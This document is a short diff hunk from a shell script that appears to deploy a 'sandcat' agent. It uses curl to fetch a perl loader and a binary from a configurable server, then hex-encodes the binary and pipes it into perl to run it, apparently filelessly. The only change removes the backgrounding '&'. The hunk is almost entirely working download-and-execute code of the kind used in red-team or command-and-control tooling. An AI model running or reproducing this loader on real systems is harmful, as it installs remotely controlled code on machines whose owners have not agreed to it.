@@ -19,7 +19,7 @@ do
             (curl -s -X POST -H 'file:sandcat-elfload.pl.1' $SC_DEFAULTSERVER/file/download &&
             ${CURL_CMD[@]} -H 'file:sandcat.go' -H 'platform:linux' $SC_DEFAULTSERVER/file/download |
             perl -e '$/=\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(<>)' &&
-            curl -s -X POST -H 'file:sandcat-elfload.pl.2' $SC_DEFAULTSERVER/file/download; ) | perl &
+            curl -s -X POST -H 'file:sandcat-elfload.pl.2' $SC_DEFAULTSERVER/file/download; ) | perl
             break
         elif [[ "$i" == "python3" ]] || [[ "$i" == "python" ]]; then
             echo "Python/python3 exists"
